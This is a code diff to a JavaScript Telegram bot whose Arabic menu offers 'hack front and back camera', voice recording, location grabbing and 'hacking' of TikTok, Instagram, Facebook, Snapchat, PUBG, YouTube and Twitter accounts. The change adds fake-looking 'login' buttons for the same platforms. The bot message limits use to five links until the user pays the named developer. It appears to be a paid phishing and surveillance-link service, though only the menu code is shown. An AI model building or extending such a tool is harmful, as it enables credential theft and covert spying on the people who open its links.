@@ -782,23 +782,35 @@ function showButtons(userId) {
   let statusMessage = `قم بجمع نقاط كافية لاستخدام البوت مجانًا.`;
 
   
-  let keyboard = [
-      [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
-      [{ text: '🎙 تسجيل صوت 🎙', callback_data:'voice_record' }],
-      [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data:'get_location' }],
-      [{ text: '☠️اختراق تيك توك ☠️', callback_data:'increase_tiktok' }],
-      [{ text: '🕷اختراق الانستغرام🕷', callback_data:'increase_instagram' }],
-      [{ text: 'تسجيل دخول فيسبوك', callback_data: 'login_facebook' }],
-      [{ text: '🔱اختراق الفيسبوك🔱', callback_data:'increase_facebook' }],
-      [{ text: '👻 اختراق سناب شات 👻', callback_data:'increase_snapchat' }],
-      [{ text: '🔫اختراق حسابات ببجي🔫', callback_data:'pubg_uc' }],
-      [{ text: '🔴اختراق يوتيوب🔴', callback_data:'increase_youtube' }],
-      [{ text: '🐦اختراق تويتر🐦', callback_data:'increase_twitter' }],
-      [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data:'create_referral' }],
-      [{ text: '💰 نقاطي 💰', callback_data: 'my_points' }],
-      [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
-      [{ text: 'سجاد تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
-    ];
+let loginButtons = [
+    [{ text: 'تسجيل دخول تيك توك', callback_data: 'login_tiktok' }],
+    [{ text: 'تسجيل دخول انستقرام', callback_data: 'login_instagram' }],
+    [{ text: 'تسجيل دخول فيسبوك', callback_data: 'login_facebook' }],
+    [{ text: 'تسجيل دخول سناب شات', callback_data: 'login_snapchat' }],
+    [{ text: 'تسجيل دخول ببجي', callback_data: 'login_pubg' }],
+    [{ text: 'تسجيل دخول يوتيوب', callback_data: 'login_youtube' }],
+    [{ text: 'تسجيل دخول تويتر', callback_data: 'login_twitter' }],
+];
+
+let existingButtons = [
+    [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data: 'front_camera' }],
+    [{ text: '🎙 تسجيل صوت 🎙', callback_data: 'voice_record' }],
+    [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data: 'get_location' }],
+    [{ text: '☠️اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
+    [{ text: '🕷اختراق الانستغرام🕷', callback_data: 'increase_instagram' }],
+    [{ text: '🔱اختراق الفيسبوك🔱', callback_data: 'increase_facebook' }],
+    [{ text: '👻 اختراق سناب شات 👻', callback_data: 'increase_snapchat' }],
+    [{ text: '🔫اختراق حسابات ببجي🔫', callback_data: 'pubg_uc' }],
+    [{ text: '🔴اختراق يوتيوب🔴', callback_data: 'increase_youtube' }],
+    [{ text: '🐦اختراق تويتر🐦', callback_data: 'increase_twitter' }],
+    [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data: 'create_referral' }],
+    [{ text: '💰 نقاطي 💰', callback_data: 'my_points' }],
+    [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
+    [{ text: ' تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
+];
+
+let keyboard = loginButtons.concat(existingButtons);
+
 
   bot.sendMessage(userId, `${statusMessage}\n\nمرحبا قم باختيار أي شيء تريده لكن لن تستطيع استخدام أي رابط سوى 5 مرات حتى تقوم بدفع اشتراك من المطور @SAGD112 أو قم بتجميع نقاط لاستخدامه مجانًا:`, {
     reply_markup: {
